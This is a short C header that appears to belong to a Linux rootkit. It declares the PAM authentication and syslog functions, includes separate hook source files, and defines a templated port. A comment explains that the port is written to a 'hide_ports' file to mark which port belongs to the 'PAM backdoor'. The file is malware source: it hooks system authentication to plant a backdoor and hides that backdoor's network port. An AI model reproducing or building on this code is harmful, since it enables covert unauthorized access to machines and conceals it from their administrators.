#ifndef __PAM_H
#define __PAM_H
#include "pam/pam_private.h"

int pam_authenticate(pam_handle_t *pamh, int flags);
int pam_open_session(pam_handle_t *pamh, int flags);
int pam_acct_mgmt(pam_handle_t *pamh, int flags);
#include "pam/pam_hooks.c"

void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...);
void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args);
#include "pam/pam_syslog.c"

/* this is literally only here so that we can write
 * a hidden port to the hide_ports file, and the
 * user knows which port is and isn't for the PAM
 * backdoor. */
#define PAM_PORT ??PAM_PORT?? // [USE_PAM_BD]
#endif
